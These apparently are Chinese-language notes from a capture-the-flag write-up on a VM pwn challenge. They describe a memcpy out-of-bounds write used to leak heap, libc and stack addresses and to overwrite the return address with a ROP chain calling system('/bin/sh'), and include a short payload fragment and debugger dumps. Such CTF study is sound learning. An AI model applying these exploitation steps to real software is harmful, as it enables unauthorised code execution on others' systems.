# 漏洞点
memcpy越界写，造成任意地址读写，泄漏heap，libc，stack
然后改写ret到`pop rdi，"/bin/sh", system`,

# 知识点
## scanf("%hd", &var)
中的 %hd 是格式说明符，意思是：读取一个 short 类型的有符号整数（16位）并存储到对应变量中。

## environ
在libc中有一个environ指向stack地址，通过泄漏environ的值和offset可以算出stack基地址
![](https://r2.20161023.xyz/pic/20250611134108238.png)

## 栈地址怎么泄漏
改state->rsp = environ-8, 然后pop就可以了
![](https://r2.20161023.xyz/pic/20250611193404646.png)

- 改rsp的是要要注意，rsp<=rbp 
- 内存值rip, rsb, rbp

## one_gadget
测试发现不可行，改为system("/bin/sh")

## 怎么退出呢？
改写rip为很大，> buf+len, 此解中改为
```
payload += mov_reg(2, 0x7FFFFFFFFFFF)
payload += push_reg(2)  # rbp
payload += push_num(0x61)
```

# debug
## v56
```
v56[0]：指令指针（指向当前执行的字节码位置）
v56[1]和v56[2]：栈指针和栈顶
v56[3]到v56[10]：8个通用寄存器（R0-R7）
```

## buf
```
0x000 - 0x100   指令区域 
0x100 - 0x8F8   栈区域
```

## stack
```
pwndbg> stack
00:0000│ rsp 0x7ffc3d191610 ◂— 0
01:0008│-038 0x7ffc3d191618 ◂— 0x1a00010000
02:0010│-030 0x7ffc3d191620 ◂— 0
03:0018│-028 0x7ffc3d191628 —▸ 0x559be9b052a0 ◂— 0x1f0435
04:0020│-020 0x7ffc3d191630 —▸ 0x559be9b05bb0 —▸ 0x559be9b052b4 ◂— 0x131ff010436
05:0028│-018 0x7ffc3d191638 ◂— 0
06:0030│-010 0x7ffc3d191640 ◂— 0
07:0038│-008 0x7ffc3d191648 ◂— 0xde8545e2aed4d00
08:0040│ rbp 0x7ffc3d191650 —▸ 0x7ffc3d1916f0 —▸ 0x7ffc3d191750 ◂— 0
09:0048│+008 0x7ffc3d191658 —▸ 0x7f867763c6b5 ◂— mov edi, eax
0a:0050│+010 0x7ffc3d191660 —▸ 0x7f8677807000 ◂— 0x3010102464c457f
0b:0058│+018 0x7ffc3d191668 —▸ 0x7ffc3d191778 —▸ 0x7ffc3d192589 ◂— './vm_chall'
0c:0060│+020 0x7ffc3d191670 ◂— 0x13d1916b0
0d:0068│+028 0x7ffc3d191678 —▸ 0x559be92d7371 (main) ◂— push rbp
```


## heap
```
Allocated chunk | PREV_INUSE
Addr: 0x557ef42a9000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x557ef42a9290
Size: 0x910 (with flag bits: 0x911)

Allocated chunk | PREV_INUSE
Addr: 0x557ef42a9ba0
Size: 0x60 (with flag bits: 0x61)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x557ef42a9c00
Size: 0x910 (with flag bits: 0x911)
fd: 0x7fee1aa3bb20
bk: 0x7fee1aa3bb20

Free chunk (tcachebins)
Addr: 0x557ef42aa510
Size: 0x60 (with flag bits: 0x60)
fd: 0x557ef42aa

Top chunk | PREV_INUSE
Addr: 0x557ef42aa570
Size: 0x1fa90 (with flag bits: 0x1fa91)
```
